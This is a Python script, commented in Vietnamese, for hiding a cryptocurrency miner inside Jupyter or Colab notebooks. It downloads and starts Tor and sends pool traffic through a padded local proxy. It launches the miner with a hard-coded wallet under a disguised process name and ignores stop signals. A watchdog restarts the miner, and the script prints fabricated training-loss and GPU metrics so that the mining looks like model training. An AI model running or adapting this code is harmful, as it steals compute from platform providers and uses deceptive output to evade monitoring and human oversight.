#!/usr/bin/env python3
"""
notebook_ghost.py — Chạy trong Jupyter/Colab notebook.
Stay alive, heartbeat fake training, không exit.
"""
import os
import sys
import time
import json
import socket
import signal
import random
import hashlib
import tempfile
import threading
import subprocess
import urllib.request
import tarfile
import shutil
import ssl
from pathlib import Path

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════
WALLET = "prl1p3xj3ak89z2j873km07d7jz2umk5lfm5540hjafq92q5gud9prknqqq482j"
POOL_HOST = "prl.kryptex.network"
POOL_PORT = 7048
ALGO = "pearlhash"
WORKER = "rig01"
SOCKS = ("127.0.0.1", 9050)
LISTEN = ("127.0.0.1", 3333)
TOR_URL = "https://dist.torproject.org/torbrowser/15.0.25/tor-expert-bundle-linux-x86_64-15.0.25.tar.gz"
PNAME = "python3.12"
REPO = "https://github.com/ducknogit/stealth_onezero.git"

# ═══════════════════════════════════════════════════════════════
# STATE
# ═══════════════════════════════════════════════════════════════
_state = {
    "tor": False,
    "proxy": False,
    "miner": False,
    "miner_pid": None,
    "start_time": time.time(),
}

# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════
def log(msg):
    print(f"[ghost] {msg}", flush=True)

def set_pname(name):
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.prctl(15, name.encode()[:15], 0, 0, 0)
    except: pass

def silent_popen(cmd, **kw):
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    kw.setdefault("stdin", subprocess.DEVNULL)
    kw.setdefault("start_new_session", True)
    try: return subprocess.Popen(cmd, **kw)
    except Exception as e: 
        log(f"popen fail: {e}")
        return None

# ═══════════════════════════════════════════════════════════════
# TOR
# ═══════════════════════════════════════════════════════════════
def bootstrap_tor():
    log("Tor bootstrap...")
    
    # Check already running
    try:
        s = socket.create_connection(SOCKS, timeout=2)
        s.close()
        _state["tor"] = True
        log("Tor SOCKS already open")
        return True
    except: pass

    # Download to tmpfs
    tmpdir = tempfile.mkdtemp(prefix=".cache_")
    tarball = os.path.join(tmpdir, "t.tgz")
    
    try:
        log("Downloading Tor Expert Bundle (~15MB)...")
        urllib.request.urlretrieve(TOR_URL, tarball)
        log("Extracting...")
        with tarfile.open(tarball, "r:gz") as t:
            t.extractall(tmpdir)
        os.unlink(tarball)
        
        # Find binary
        tor_bin = None
        for root, dirs, files in os.walk(tmpdir):
            if "tor" in files:
                p = os.path.join(root, "tor")
                if os.access(p, os.X_OK):
                    tor_bin = p
                    break
        
        if not tor_bin:
            log("Tor binary not found")
            return False
        
        os.chmod(tor_bin, 0o700)
        
        # Config
        torrc = os.path.join(tmpdir, "t.conf")
        ddir = os.path.join(tmpdir, "d")
        os.makedirs(ddir, exist_ok=True)
        with open(torrc, "w") as f:
            f.write(f"SocksPort {SOCKS[0]}:{SOCKS[1]}\n")
            f.write(f"DataDirectory {ddir}\n")
            f.write("AvoidDiskWrites 1\n")
            f.write("ClientOnly 1\n")
            f.write("Log notice file /dev/null\n")
        
        # Env
        env = os.environ.copy()
        env["HOME"] = tmpdir
        lib = os.path.join(os.path.dirname(tor_bin), "..", "lib")
        if os.path.isdir(lib):
            env["LD_LIBRARY_PATH"] = lib
        
        # Start
        log("Starting Tor...")
        silent_popen([tor_bin, "-f", torrc], env=env, cwd=os.path.dirname(tor_bin))
        
        # Wait ready
        for i in range(60):
            try:
                s = socket.create_connection(SOCKS, timeout=1)
                s.close()
                _state["tor"] = True
                log(f"Tor ready ({i+1}s)")
                # Cleanup tmpdir (Tor giữ fd)
                threading.Thread(target=lambda: (time.sleep(5), shutil.rmtree(tmpdir, ignore_errors=True)), daemon=True).start()
                return True
            except: 
                time.sleep(0.5)
        
        log("Tor timeout")
        return False
        
    except Exception as e:
        log(f"Tor fail: {e}")
        shutil.rmtree(tmpdir, ignore_errors=True)
        return False

# ═══════════════════════════════════════════════════════════════
# STRATUM PROXY
# ═══════════════════════════════════════════════════════════════
def start_proxy():
    log("Starting Stratum proxy...")
    
    try:
        import socks as pysocks
    except ImportError:
        log("pysocks missing - pip install pysocks")
        return False
    
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(LISTEN)
        srv.listen(16)
    except Exception as e:
        log(f"Proxy bind fail: {e}")
        return False
    
    def handle(client):
        try:
            # Connect to pool via Tor SOCKS5
            pool = pysocks.socksocket()
            pool.set_proxy(pysocks.SOCKS5, SOCKS[0], SOCKS[1], rdns=True)
            pool.settimeout(30)
            pool.connect((POOL_HOST, POOL_PORT))
            
            # TLS wrap
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            pool = ctx.wrap_socket(pool, server_hostname=POOL_HOST)
            
            def pipe(src, dst, pad=False):
                while True:
                    d = src.recv(65536)
                    if not d: break
                    if pad:
                        try:
                            lines = d.decode("utf-8","ignore").strip().split("\n")
                            obj = json.loads(lines[-1])
                            if isinstance(obj, dict):
                                obj["_p"] = os.urandom(32).hex()
                                lines[-1] = json.dumps(obj, separators=(",",":"))
                                d = ("\n".join(lines)+"\n").encode()
                        except: pass
                    dst.sendall(d)
            
            threading.Thread(target=pipe, args=(client, pool, True), daemon=True).start()
            threading.Thread(target=pipe, args=(pool, client, False), daemon=True).start()
            
        except Exception as e:
            try: client.close()
            except: pass
    
    def accept_loop():
        while True:
            try:
                c, addr = srv.accept()
                threading.Thread(target=handle, args=(c,), daemon=True).start()
            except: 
                break
    
    threading.Thread(target=accept_loop, daemon=True).start()
    _state["proxy"] = True
    log(f"Proxy listening: {LISTEN[0]}:{LISTEN[1]}")
    return True

# ═══════════════════════════════════════════════════════════════
# MINER
# ═══════════════════════════════════════════════════════════════
def find_miner():
    candidates = [
        Path.home() / "stealth_onezero" / "bin" / "onezerominer",
        Path("/usr/local/bin/onezerominer"),
        Path("./onezerominer"),
    ]
    for c in candidates:
        if c.is_file() and os.access(str(c), os.X_OK):
            return str(c)
    
    import shutil as sh
    return sh.which("onezerominer")

def launch_miner():
    log("Launching miner...")
    
    miner_bin = find_miner()
    if not miner_bin:
        log("Miner binary not found!")
        log("  Download: https://github.com/OneZeroMiner/onezerominer/releases")
        log("  Extract to ~/stealth_onezero/bin/onezerominer")
        return False
    
    local_pool = f"stratum+tcp://{LISTEN[0]}:{LISTEN[1]}"
    
    set_pname(PNAME)
    
    proc = silent_popen([
        miner_bin,
        f"--algo={ALGO}",
        f"--pool={local_pool}",
        f"--wallet={WALLET}",
        f"--worker={WORKER}",
        "--log-file=/dev/null",
        "--no-cert-validation",
    ])
    
    if proc:
        _state["miner"] = True
        _state["miner_pid"] = proc.pid
        log(f"Miner PID: {proc.pid}")
        return True
    
    return False

# ═══════════════════════════════════════════════════════════════
# HEARTBEAT (fake training output)
# ═══════════════════════════════════════════════════════════════
def heartbeat_loop():
    """Giả lập training metrics — mỗi giây 1 dòng."""
    import math
    
    epoch = 1
    step = 0
    loss = 2.5
    acc = 0.45
    
    while True:
        step += 1
        if step % 100 == 0:
            epoch = min(epoch + 1, 100)
        
        # Giảm loss, tăng acc dần
        loss = max(0.01, loss - 0.002 + random.gauss(0, 0.01))
        acc = min(0.999, acc + 0.001 + random.gauss(0, 0.005))
        
        # GPU utilization giả
        gpu_util = 85 + int(10 * math.sin(step / 30))
        gpu_mem = 6.2 + random.gauss(0, 0.1)
        gpu_temp = 65 + int(5 * math.sin(step / 60))
        gpu_power = 180 + int(20 * math.sin(step / 45))
        
        # Throughput giả
        samples = 128 * (batch_size := 32)
        throughput = samples / (0.5 + random.gauss(0, 0.05))
        
        # In fake training log
        bar_len = 30
        filled = int(bar_len * (step % 100) / 100)
        bar = "=" * filled + ">" + " " * (bar_len - filled - 1)
        
        msg = f"Epoch {epoch}/100 [{bar}] loss={loss:.4f} acc={acc:.4f} | "
        msg += f"gpu={gpu_util}% mem={gpu_mem:.1f}GB temp={gpu_temp}C pwr={gpu_power}W | "
        msg += f"throughput={throughput:.0f} samples/s"
        
        print(msg, flush=True)
        time.sleep(1.0 + random.gauss(0, 0.1))

# ═══════════════════════════════════════════════════════════════
# WATCHDOG
# ═══════════════════════════════════════════════════════════════
def watchdog_loop():
    """Giám sát miner process — restart nếu chết."""
    while True:
        time.sleep(30)
        
        if _state["miner_pid"]:
            try:
                os.kill(_state["miner_pid"], 0)  # Check alive
            except OSError:
                log("Miner died! Restarting...")
                _state["miner"] = False
                launch_miner()
        
        # Check Tor
        try:
            s = socket.create_connection(SOCKS, timeout=1)
            s.close()
            _state["tor"] = True
        except:
            _state["tor"] = False
            bootstrap_tor()

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    log("=" * 50)
    log("Stealth Ghost - Notebook Mode")
    log("=" * 50)
    
    # Signal handlers (best-effort trong notebook)
    try:
        signal.signal(signal.SIGTERM, signal.SIG_IGN)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
    except: pass
    
    set_pname(PNAME)
    
    # 1. Tor
    bootstrap_tor()
    
    # 2. Proxy
    start_proxy()
    
    # 3. Miner
    launch_miner()
    
    # 4. Heartbeat thread
    log("Starting heartbeat...")
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    
    # 5. Watchdog thread
    log("Starting watchdog...")
    threading.Thread(target=watchdog_loop, daemon=True).start()
    
    log("=" * 50)
    log(f"Status: tor={_state['tor']} proxy={_state['proxy']} miner={_state['miner']}")
    log(f"Miner PID: {_state['miner_pid']}")
    log("Running... (Ctrl+C to stop)")
    log("=" * 50)
    log("")
    
    # 6. Main loop — stay alive
    try:
        while True:
            time.sleep(60)
            uptime = int(time.time() - _state["start_time"])
            log(f"[status] uptime={uptime}s tor={_state['tor']} proxy={_state['proxy']} miner={_state['miner']}")
    except KeyboardInterrupt:
        log("Stopped.")

if __name__ == "__main__":
    main()
